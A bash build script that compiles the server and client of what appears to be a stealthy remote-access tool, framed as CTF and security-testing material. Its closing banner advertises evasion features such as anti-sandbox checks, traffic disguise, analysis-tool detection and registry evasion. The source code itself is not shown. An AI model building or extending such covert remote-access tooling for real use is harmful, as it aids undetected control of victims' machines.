#!/bin/bash

echo "========================================================="
echo "🖥️  Stealth Remote Desktop Build Script"
echo "========================================================="
echo

# Detect OS
OS="Unknown"
if [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "win32" ]]; then
    OS="Windows"
elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
    OS="Linux"
elif [[ "$OSTYPE" == "darwin"* ]]; then
    OS="macOS"
fi

echo "🔍 Detected OS: $OS"

# Compilation flags
CPP_FLAGS="-std=c++17 -O2 -Wall"
CLIENT_LIBS=""
SERVER_LIBS=""

if [[ "$OS" == "Windows" ]]; then
    # Windows-specific libraries for GUI remote desktop
    CLIENT_LIBS="-lwinhttp -lshlwapi -lws2_32 -ladvapi32 -lcrypt32 -lgdiplus -lgdi32 -luser32 -static"
    SERVER_LIBS="-lws2_32 -static"
    CLIENT_EXE="rdp_client.exe"
    SERVER_EXE="rdp_server.exe"
    echo "🎯 Target: Windows Remote Desktop"
elif [[ "$OS" == "Linux" ]]; then
    # Linux would need X11 libraries for screen capture
    CLIENT_LIBS="-pthread -lX11 -lXext"
    SERVER_LIBS="-pthread"
    CLIENT_EXE="rdp_client"
    SERVER_EXE="rdp_server"
    echo "🎯 Target: Linux Remote Desktop"
    echo "⚠️  Note: Linux client requires X11 development libraries"
    echo "   Install with: sudo apt-get install libx11-dev libxext-dev"
else
    echo "❌ Unsupported OS for GUI remote desktop"
    exit 1
fi

echo
echo "🔨 Building Stealth Remote Desktop..."
echo

# Build server first
echo "📡 Compiling server..."
if g++ $CPP_FLAGS server.cpp -o $SERVER_EXE $SERVER_LIBS; then
    echo "✅ Server compiled successfully: $SERVER_EXE"
else
    echo "❌ Server compilation failed"
    echo "💡 Make sure you have a C++17 compatible compiler installed"
    exit 1
fi

# Build client
echo "🖥️  Compiling client..."
if g++ $CPP_FLAGS client.cpp -o $CLIENT_EXE $CLIENT_LIBS; then
    echo "✅ Client compiled successfully: $CLIENT_EXE"
else
    echo "❌ Client compilation failed"
    if [[ "$OS" == "Windows" ]]; then
        echo "💡 Make sure you have the Windows SDK or MinGW-w64 installed"
        echo "💡 Required libraries: winhttp, gdiplus, gdi32, user32"
    elif [[ "$OS" == "Linux" ]]; then
        echo "💡 Install required libraries:"
        echo "   sudo apt-get install libx11-dev libxext-dev"
    fi
    exit 1
fi

echo
echo "========================================================="
echo "🎉 BUILD COMPLETE!"
echo "========================================================="
echo "📁 Files created:"
echo "   Server: $SERVER_EXE"
echo "   Client: $CLIENT_EXE"
echo
echo "🚀 Quick Start:"
echo "   1. Start server: ./$SERVER_EXE [port]"
echo "   2. Open browser: http://localhost:8080"
echo "   3. Connect client: ./$CLIENT_EXE <server_ip> <server_port>"
echo
echo "🖥️  Simple Remote Desktop Interface:"
echo "   ✅ Clean desktop window (no extra UI)"
echo "   ✅ Mouse and keyboard control"
echo "   ✅ Real-time screen streaming"
echo "   ✅ Auto-connects to first available session"
echo "   ✅ Resizable window"
echo
echo "🥷 Stealth Features Enabled:"
echo "   ✅ Advanced anti-VM/sandbox detection"
echo "   ✅ Traffic disguised as video streaming"
echo "   ✅ Custom encryption and compression"
echo "   ✅ Legitimate-looking HTTP headers"
echo "   ✅ Analysis tool detection"
echo "   ✅ Process and registry evasion"
echo "   ✅ Adaptive timing (mimics human behavior)"
echo
echo "🎯 For CTF/Security Testing:"
echo "   • This demonstrates advanced GUI-based remote access"
echo "   • Tests network monitoring and behavioral analysis"
echo "   • Challenges traditional signature-based detection"
echo "   • Shows realistic attack patterns used by adversaries"
echo
echo "⚠️  IMPORTANT SECURITY NOTES:"
echo "   • Only use on systems you own or have permission to test"
echo "   • This tool is for educational/testing purposes only"
echo "   • The stealth features demonstrate real attack techniques"
echo
echo "🔧 Troubleshooting:"
if [[ "$OS" == "Windows" ]]; then
    echo "   • If compilation fails, install Visual Studio Build Tools"
    echo "   • Or use MinGW-w64 with MSYS2"
    echo "   • Ensure Windows SDK is available"
elif [[ "$OS" == "Linux" ]]; then
    echo "   • Install build essentials: sudo apt-get install build-essential"
    echo "   • Install X11 libraries: sudo apt-get install libx11-dev libxext-dev"
    echo "   • For screen capture, ensure X11 is running"
fi
echo
echo "🌟 Ready for your CTF challenge!"
echo "========================================================="
